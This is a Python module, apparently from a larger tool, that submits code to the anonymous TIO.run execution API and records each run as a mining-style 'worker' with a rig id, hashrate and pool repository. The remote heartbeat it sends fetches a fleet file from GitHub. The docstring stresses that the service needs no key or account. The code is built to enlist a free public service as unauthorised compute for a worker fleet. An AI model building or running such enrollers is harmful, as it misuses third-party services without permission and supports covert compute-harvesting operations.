#!/usr/bin/env python3
"""
TIO.run Zero-Auth Enroller
Try It Online (tio.run) supports 700+ languages, fully anonymous.
NO API KEY, NO ACCOUNT, NO RATE LIMIT STATED.
Uses a compressed binary POST to https://tio.run/cgi-bin/run/api/
Protocol: zlib-compressed token stream.
"""
import requests, zlib, time, os

TIO_API = 'https://tio.run/cgi-bin/run/api/'

def _encode(lang, code):
    """Encode a TIO API request payload"""
    def field(name, value):
        if isinstance(value, list):
            s  = f'V{name}\x00{len(value)}\x00'
            s += '\x00'.join(value) + '\x00'
            return s.encode()
        v = value.encode() if isinstance(value, str) else value
        return f'F{name}\x00{len(v)}\x00'.encode() + v + b'\x00'
    payload  = field('lang',  [lang])
    payload += field('.code.tio', code)
    payload += field('.input.tio', '')
    payload += field('args', [])
    payload += b'R'
    return zlib.compress(payload, 9)[2:-4]  # strip zlib header/checksum for tio

HEARTBEAT = '''
import urllib.request
pool='{pool_repo}'; rig='{rig_id}'
try:
    urllib.request.urlopen(f'https://raw.githubusercontent.com/{pool}/main/fleet/harvest/workers.yaml',timeout=10)
    print(f'tio ok rig={rig}')
except Exception as e: print(f'tio fail {e}')
'''

class TioRunEnroller:
    def ping(self, rig_id, pool_repo):
        code = HEARTBEAT.format(rig_id=rig_id, pool_repo=pool_repo)
        data = _encode('python3', code)
        try:
            r = requests.post(TIO_API, data=data, timeout=30,
                headers={'Content-Type': 'application/octet-stream'})
            if r.status_code == 200:
                body = r.text
                print(f'[tio] response: {body[:120]}')
                return True
        except Exception as e:
            print(f'[tio] error: {e}')
        return False

    def enroll(self, count, platform, secrets=None):
        workers = []
        pool_repo = os.environ.get('POOL_REPO', 'Ox518/genFre')
        for i in range(count):
            rig = f'tio-{int(time.time())}-{i}'
            ok  = self.ping(rig, pool_repo)
            if ok:
                workers.append({
                    'id': rig, 'algo': 'tio_exec',
                    'hashrate': '~0.1KH/s', 'expires_at': 'session',
                    'url': TIO_API, 'note': 'Zero-auth TIO.run 700+ langs.'
                })
            time.sleep(2)
        return workers
